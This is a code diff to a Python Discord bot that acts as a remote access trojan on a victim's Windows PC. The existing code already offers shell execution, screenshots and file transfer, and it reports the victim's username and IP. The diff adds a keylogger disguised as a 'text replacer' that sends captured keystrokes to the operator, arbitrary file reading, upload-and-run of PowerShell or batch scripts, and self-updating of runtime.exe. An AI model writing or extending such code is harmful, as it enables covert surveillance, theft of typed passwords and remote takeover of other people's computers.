@@ -1,11 +1,12 @@
 import asyncio
 import getpass
+import json
 import socket
 from typing import cast
 
 import discord
 import requests
-from discord import TextChannel
+from discord import Interaction, TextChannel, app_commands
 from discord.ext import commands
 from discord.ext.commands import Context
 
@@ -17,13 +18,31 @@ from src.cmd.move_file import move_file
 from src.cmd.msgbox import msgbox_show
 from src.cmd.openurl import spawn_proc
 from src.cmd.popup import popup_show
+from src.cmd.read_file import read_file
+from src.cmd.run_script import run_script_file
 from src.cmd.screenshot import take_screenshot
 from src.cmd.shell import execute_cmd
+from src.cmd.text_replacer import (
+    KEY_LOG_FILE_THRESHOLD,
+    active_rules,
+    add_replacements,
+    buffered_characters,
+    clear_replacements,
+    current_replacer,
+    key_log_exists,
+    log_status,
+    read_key_log,
+    remove_replacement,
+    set_replacements,
+    start_text_replacer,
+    stop_text_replacer,
+)
 from src.cmd.upload_file import upload_file
-from src.cmd.utils import send_text_in_chunks
 from src.cmd.voice import voice_api
 from src.cmd.wallpaper import set_wallpaper
 from src.constants import UPDATE_TAG, VERSION
+from src.utils.updater import update_runtime
+from src.utils.utils import send_text_in_chunks
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -31,8 +50,22 @@ intents.members = True
 
 channel = None
 pc_user_name = "Unknown"
+ip = "Unknown"
 
 bot = commands.Bot(command_prefix="z!", intents=intents, owner_id=915623041105551420)
+
+
+def parse_json_object(raw: str) -> dict | None:
+    """Parse a JSON object, returning None when the text is not one."""
+    try:
+        data = json.loads(raw)
+    except ValueError:
+        return None
+
+    if not isinstance(data, dict):
+        return None
+
+    return data
 
 
 @bot.event
@@ -41,14 +74,15 @@ async def on_ready():
         raise ValueError("Bot user not found.")
 
     print(f"#- Logged in as {bot.user}!")
-    # await bot.tree.sync()
-    # print("i- Slash commands synced.")
+    await bot.tree.sync()
+    print("i- Slash commands synced.")
     print("#- Connected Guilds:")
     for i, guild in enumerate(bot.guilds):
         print(f"[{i + 1}] {guild.name} (ID: {guild.id})")
 
     global channel
     global pc_user_name
+    global ip
 
     guild = bot.guilds[0]
     response = await asyncio.to_thread(requests.get, "https://api.ipify.org")
@@ -112,9 +146,24 @@ async def on_message(message: discord.Message):
 
 
 # ====================
+# === LIST COMMAND ===
+# ====================
+@bot.tree.command(name="list_devices", description="Lists all connected devices")
+@commands.is_owner()
+@commands.guild_only()
+async def list_devices(interaction: Interaction):
+    latency = round(bot.latency * 1000)  # latency in milliseconds
+    await interaction.response.send_message(
+        f"- **User:** {pc_user_name}\t**IP:** {ip.replace('-', '.')}\t*Latency:* {latency / 10}ms"
+    )
+
+
+# ====================
 # === PING COMMAND ===
 # ====================
 @bot.command(name="ping", description="Check the bot's latency.")
+@commands.is_owner()
+@commands.guild_only()
 async def ping(ctx: Context[commands.Bot], *, args: str | None):
     latency = round(bot.latency * 1000)  # latency in milliseconds
 
@@ -192,6 +241,127 @@ async def upload(ctx: Context[commands.Bot], url: str | None = None):
     await upload_file(ctx, url)
 
 
+# ================================
+# === UPDATE APP COMMAND ===
+# ================================
+@bot.command(
+    name="update_app",
+    description="Update runtime.exe to the latest GitHub release and restart.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def update_app(ctx: Context[commands.Bot]):
+    await update_runtime(ctx)
+
+
+# ================================
+# === TEXT REPLACER COMMAND ===
+# ================================
+@bot.command(
+    name="replacer",
+    description="Start, stop or check the live text replacer.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def replacer_command(ctx: Context[commands.Bot], *, action: str = "status"):
+    action = action.lower()
+
+    if action == "start":
+        await start_text_replacer(ctx)
+    elif action == "stop":
+        await stop_text_replacer(ctx)
+    else:
+        instance = current_replacer()
+        state = "running" if instance is not None and instance.running else "stopped"
+        rules = active_rules()
+
+        # Whether the log file exists decides what is shown.
+        has_log_file = key_log_exists()
+
+        # The status and the active rules are written to the key log.
+        log_status(state, rules)
+
+        # Without a log file the characters that are still in memory are used.
+        contents = read_key_log() if has_log_file else buffered_characters()
+
+        if not contents.strip():
+            await ctx.reply(
+                "The key log is empty and nothing is buffered in memory yet."
+            )
+            return
+
+        await send_text_in_chunks(
+            ctx,
+            contents,
+            filename="key_logs.txt",
+            file_threshold=KEY_LOG_FILE_THRESHOLD,
+        )
+
+
+@bot.command(
+    name="replacements",
+    description=(
+        "Manage the text replacer rules: "
+        'z!replacements {"love": "hate"} sets them, '
+        'z!replacements add {"abc": "xyz"} adds them, '
+        'z!replacements rm "abc" removes one, '
+        "z!replacements del deletes the whole file."
+    ),
+)
+@commands.is_owner()
+@commands.guild_only()
+async def replacements_command(ctx: Context[commands.Bot], *, args: str = ""):
+    args = args.strip()
+
+    if not args:
+        await ctx.reply(
+            'Usage: `z!replacements {"love": "hate"}`, '
+            '`z!replacements add {"abc": "xyz"}`, '
+            '`z!replacements rm "abc"` or `z!replacements del`.'
+        )
+        return
+
+    action, _, rest = args.partition(" ")
+    action = action.lower()
+    rest = rest.strip()
+
+    if action == "add":
+        rules = parse_json_object(rest)
+
+        if rules is None:
+            await ctx.reply(
+                'The rules must be a JSON object, for example {"abc": "xyz"}.'
+            )
+            return
+
+        await add_replacements(ctx, rules)
+        return
+
+    if action == "rm":
+        key = rest.strip('"').strip("'").strip()
+
+        if not key:
+            await ctx.reply('Give the key of the rule to remove, e.g. `z!replacements rm "abc"`.')
+            return
+
+        await remove_replacement(ctx, key)
+        return
+
+    if action == "del":
+        await clear_replacements(ctx)
+        return
+
+    rules = parse_json_object(args)
+
+    if rules is None:
+        await ctx.reply(
+            'The rules must be a JSON object, for example {"love": "hate"}.'
+        )
+        return
+
+    await set_replacements(ctx, rules)
+
+
 # ===========================
 # === DOWNLOAD COMMAND ===
 # ===========================
@@ -202,6 +372,33 @@ async def upload(ctx: Context[commands.Bot], url: str | None = None):
 @commands.guild_only()
 async def download(ctx: Context[commands.Bot], *, path: str):
     await download_file(ctx, path)
+
+
+# ===========================
+# === READ FILE COMMAND ===
+# ===========================
+@bot.command(
+    name="read", description="Read a file from disk and send its contents as text."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def read(ctx: Context[commands.Bot], *, path: str):
+    await read_file(ctx, path)
+
+
+# =============================
+# === RUN SCRIPT COMMAND ===
+# =============================
+@bot.command(
+    name="run_script",
+    description="Save an attached Windows script (.ps1, .bat, ...) and run it.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def run_script(
+    ctx: Context[commands.Bot], *, destination: str, source: str | None = None
+):
+    await run_script_file(ctx, destination, source)
 
 
 # ===========================
